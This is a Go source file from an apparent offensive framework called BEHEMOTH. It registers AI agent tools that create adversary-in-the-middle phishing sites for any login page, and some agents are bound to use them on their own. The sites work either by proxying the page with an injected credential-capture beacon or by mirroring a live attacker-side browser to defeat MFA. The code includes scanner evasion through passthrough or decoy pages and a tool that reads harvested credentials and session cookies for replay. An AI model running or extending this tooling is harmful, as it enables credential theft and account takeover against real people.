package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/Autumn-27/behemoth/phish"
	actool "github.com/Autumn-27/norma/tool"
)

// phishPublicBaseURL resolves the base URL advertised to operators for phish
// sites: BEHEMOTH_PHISH_PUBLIC_URL wins, then the listener address.
func phishPublicBaseURL(addr string) string {
	if v := strings.TrimSpace(os.Getenv("BEHEMOTH_PHISH_PUBLIC_URL")); v != "" {
		return strings.TrimSuffix(v, "/")
	}
	if addr == "" {
		return ""
	}
	if strings.HasPrefix(addr, ":") {
		return "http://127.0.0.1" + addr
	}
	return "http://" + addr
}

// phishListenerAddr resolves the dedicated phishing listener address.
// Empty BEHEMOTH_PHISH_ADDR falls back to 127.0.0.1:8789.
func phishListenerAddr() string {
	if v := strings.TrimSpace(os.Getenv("BEHEMOTH_PHISH_ADDR")); v != "" {
		return v
	}
	return "127.0.0.1:8789"
}

// phishManager lazily initializes the phish manager and its capture hook.
// The HTTP listener itself starts lazily with the first enabled site.
func (s *Server) phishManager() *phish.Manager {
	s.phishMu.Lock()
	defer s.phishMu.Unlock()
	if s.phishM != nil {
		return s.phishM
	}
	if s.dataDir == "" {
		return nil
	}
	mgr, err := phish.NewManager(filepath.Join(s.dataDir, "phish"))
	if err != nil {
		log.Printf("[phish] init: %v", err)
		return nil
	}
	if s.m != nil && s.m.pg != nil {
		mgr.SetCaptureHook(func(c phish.Capture) {
			log.Printf("[phish] capture #%d site=%s user=%q cookies=%d", c.ID, c.SiteLabel, c.Username, len(c.Cookies))
		})
	}
	s.phishM = mgr
	log.Printf("[phish] ready (%d sites restored)", len(mgr.List()))
	return mgr
}

// ensurePhishListener starts the dedicated phish listener once at least one
// site is enabled. Best-effort: failures are logged and reported back to the
// caller through the returned note.
func (s *Server) ensurePhishListener() string {
	s.phishMu.Lock()
	defer s.phishMu.Unlock()
	if s.phishSrv != nil || s.phishM == nil || s.phishM.EnabledCount() == 0 {
		return ""
	}
	addr := phishListenerAddr()
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("[phish] listener %s: %v", addr, err)
		return fmt.Sprintf("listener %s failed: %v", addr, err)
	}
	handler := &phish.Handler{M: s.phishM, PublicURL: phishPublicBaseURL(addr)}
	srv := &http.Server{Addr: addr, Handler: handler, ReadHeaderTimeout: 10 * time.Second}
	s.phishSrv = srv
	s.phishLn = ln
	go func() {
		cert, key := os.Getenv("BEHEMOTH_PHISH_TLS_CERT"), os.Getenv("BEHEMOTH_PHISH_TLS_KEY")
		var serr error
		if cert != "" && key != "" {
			serr = srv.ServeTLS(ln, cert, key)
		} else {
			serr = srv.Serve(ln)
		}
		if serr != nil && serr != http.ErrServerClosed {
			log.Printf("[phish] listener: %v", serr)
		}
	}()
	log.Printf("[phish] dedicated listener on %s", ln.Addr())
	return "listener started on " + ln.Addr().String()
}

// stopPhishListener shuts the phish listener down on server close.
func (s *Server) stopPhishListener() {
	s.phishMu.Lock()
	srv := s.phishSrv
	s.phishSrv = nil
	s.phishMu.Unlock()
	if srv != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		_ = srv.Shutdown(ctx)
	}
}

// phishTools returns the AiTM phishing agent tools.
func (s *Server) phishTools() []actool.CoreTool {
	return []actool.CoreTool{
		s.toolManagePhishSite(),
		s.toolPhishCaptures(),
	}
}

// seedPhishToolsV1 seeds the phish agent tools into the tools table and binds
// them to the operational + reporting agents (one-shot, settings-flag guarded).
func (s *Server) seedPhishToolsV1() {
	const flag = "phish_tools_v1"
	if s.m.pg == nil {
		return
	}
	if v, _, _ := s.m.pg.GetSetting(flag); v == "true" {
		return
	}
	tools := s.phishTools()
	keys := make([]string, 0, len(tools))
	for _, t := range tools {
		schema, _ := json.Marshal(t.InputSchema())
		binds, _ := json.Marshal([]string{"auto", "pentest", "worker", "planner", "mainagent", "reporter"})
		_ = s.m.pg.SeedTool(t.Name(), t.Description(), schema, binds)
		_ = s.m.pg.RefreshToolDefaults(t.Name(), t.Description(), schema)
		keys = append(keys, t.Name())
	}
	for _, agKey := range []string{"auto", "pentest", "worker", "planner", "mainagent", "reporter"} {
		_ = s.m.pg.AddAgentToToolBinding(agKey, keys)
	}
	_ = s.m.pg.SetSetting(flag, "true")
}

// toolManagePhishSite exposes manage_phish_site.
func (s *Server) toolManagePhishSite() actool.CoreTool {
	return wrTool("manage_phish_site",
		"Create and control BEHEMOTH's built-in AiTM phishing sites (DOMDIFFER-style kit, any target not just Google/Microsoft). Actions: create (target_url + optional hosts/mode/bot filters), update, enable, disable, delete, list. mode=proxy relays and rewrites the real login page with a credential-capture beacon; mode=mirror streams the LIVE DOM of an attacker-side headless Chrome session to the victim (true DOM mirroring, best MFA/adaptive-auth fidelity, needs Chrome on the host). bot_action=passthrough serves security scanners the genuine page untouched (scanner evasion), block 404s them, decoy serves decoy_html. Captured credentials and session cookies land in phish_captures. The listener binds BEHEMOTH_PHISH_ADDR (default 127.0.0.1:8789, optional TLS via BEHEMOTH_PHISH_TLS_CERT/KEY) on first enabled site — point DNS/hosts entries for the chosen phish hosts at this server.",
		objSchema(map[string]any{
			"action":             strParam("create | update | list | enable | disable | delete"),
			"site_id":            strParam("Site ID (ph_...) for update/enable/disable/delete"),
			"label":              strParam("Operator label for the site"),
			"target_url":         strParam("Genuine sign-in page to relay, e.g. https://accounts.google.com or any login URL"),
			"mode":               strParam("proxy (default) or mirror"),
			"hosts":              strParam("Comma-separated phish hostnames this site answers on (Host header), e.g. signin.acme-sso.net"),
			"extra_target_hosts": strParam("Comma-separated additional upstream hostnames to rewrite (e.g. www.google.com when target is accounts.google.com)"),
			"capture":            map[string]any{"type": "boolean", "description": "Inject the credential-capture beacon (proxy mode; default true for create)"},
			"bot_action":         strParam("none (default) | passthrough (serve scanners the genuine page) | block | decoy"),
			"bot_ua":             strParam("Comma-separated scanner User-Agent markers (regex); defaults to the built-in scanner list when bot_action != none"),
			"bot_ips":            strParam("Comma-separated scanner IPs/CIDRs"),
			"decoy_html":         strParam("HTML served to scanners when bot_action=decoy"),
		}, "action"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.phishManager()
			if mgr == nil {
				return actool.Errorf("phish manager unavailable (no data dir)"), nil
			}
			var a struct {
				Action           string `json:"action"`
				SiteID           string `json:"site_id"`
				Label            string `json:"label"`
				TargetURL        string `json:"target_url"`
				Mode             string `json:"mode"`
				Hosts            string `json:"hosts"`
				ExtraTargetHosts string `json:"extra_target_hosts"`
				Capture          *bool  `json:"capture"`
				BotAction        string `json:"bot_action"`
				BotUA            string `json:"bot_ua"`
				BotIPs           string `json:"bot_ips"`
				DecoyHTML        string `json:"decoy_html"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			buildInput := func() phish.SiteInput {
				return phish.SiteInput{
					Label:            a.Label,
					TargetURL:        a.TargetURL,
					Mode:             a.Mode,
					Hosts:            splitCommaList(a.Hosts),
					ExtraTargetHosts: splitCommaList(a.ExtraTargetHosts),
					Capture:          a.Capture == nil || *a.Capture,
					BotAction:        a.BotAction,
					BotUA:            splitCommaList(a.BotUA),
					BotIPs:           splitCommaList(a.BotIPs),
					DecoyHTML:        a.DecoyHTML,
				}
			}
			switch strings.ToLower(strings.TrimSpace(a.Action)) {
			case "create":
				site, err := mgr.CreateSite(buildInput())
				if err != nil {
					return actool.Errorf(err.Error()), nil
				}
				note := s.ensurePhishListener()
				return jsonResult(map[string]any{
					"site": site, "listener": phishListenerAddr(),
					"public_base_url": phishPublicBaseURL(phishListenerAddr()),
					"note":            phishSiteNote(site, note),
				})
			case "update":
				site, err := mgr.UpdateSite(a.SiteID, buildInput())
				if err != nil {
					return actool.Errorf(err.Error()), nil
				}
				return jsonResult(map[string]any{"site": site})
			case "enable":
				site, err := mgr.Enable(a.SiteID, true)
				if err != nil {
					return actool.Errorf(err.Error()), nil
				}
				return jsonResult(map[string]any{"site": site, "listener_note": s.ensurePhishListener()})
			case "disable":
				site, err := mgr.Enable(a.SiteID, false)
				if err != nil {
					return actool.Errorf(err.Error()), nil
				}
				return jsonResult(map[string]any{"site": site})
			case "delete":
				if err := mgr.Delete(a.SiteID); err != nil {
					return actool.Errorf(err.Error()), nil
				}
				return jsonResult(map[string]any{"deleted": a.SiteID})
			case "list":
				sites := mgr.List()
				return jsonResult(map[string]any{
					"count":           len(sites),
					"sites":           sites,
					"listener":        phishListenerAddr(),
					"public_base_url": phishPublicBaseURL(phishListenerAddr()),
					"captures_hint":   "Use phish_captures to read harvested credentials/cookies.",
				})
			default:
				return actool.Errorf("action must be create, update, list, enable, disable or delete"), nil
			}
		})
}

// phishSiteNote builds operational guidance for a freshly managed site.
func phishSiteNote(site *phish.Site, listenerNote string) string {
	var sb strings.Builder
	if listenerNote != "" {
		sb.WriteString(listenerNote + ". ")
	}
	if len(site.Hosts) == 0 {
		sb.WriteString("No phish hosts configured: add at least one host so the site can be routed by Host header. ")
	}
	switch site.Mode {
	case phish.ModeMirror:
		sb.WriteString("Mirror mode needs a local Chrome/Chromium binary (chromedp launches it) — one attacker-side browser per victim; credentials and session cookies are captured when the page navigates past the entry URL.")
	default:
		sb.WriteString("Proxy mode rewrites the genuine page into the phish host; verify the target's absolute URLs (extra_target_hosts) render correctly before phishing.")
	}
	return sb.String()
}

func splitCommaList(raw string) []string {
	out := []string{}
	for _, p := range strings.Split(raw, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

// toolPhishCaptures exposes phish_captures.
func (s *Server) toolPhishCaptures() actool.CoreTool {
	return roTool("phish_captures",
		"Read credentials and session cookies harvested by BEHEMOTH's AiTM phishing sites (both proxy and DOM-mirror modes). Filter by site_id; newest first.",
		objSchema(map[string]any{
			"site_id": strParam("Filter by phish site ID (ph_...); empty lists all sites"),
			"limit":   map[string]any{"type": "integer", "description": "How many recent captures to return (default 20, max 200)"},
		}),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.phishManager()
			if mgr == nil {
				return actool.Errorf("phish manager unavailable (no data dir)"), nil
			}
			var a struct {
				SiteID string `json:"site_id"`
				Limit  int    `json:"limit"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			if a.SiteID != "" {
				if _, ok := mgr.Get(a.SiteID); !ok {
					return actool.Errorf(fmt.Sprintf("unknown phish site %q", a.SiteID)), nil
				}
			}
			caps := mgr.Captures(a.SiteID, a.Limit)
			return jsonResult(map[string]any{
				"count":    len(caps),
				"captures": caps,
				"hint":     "Record verified entries with record_intelligence; cookies are ready for session replay.",
			})
		})
}
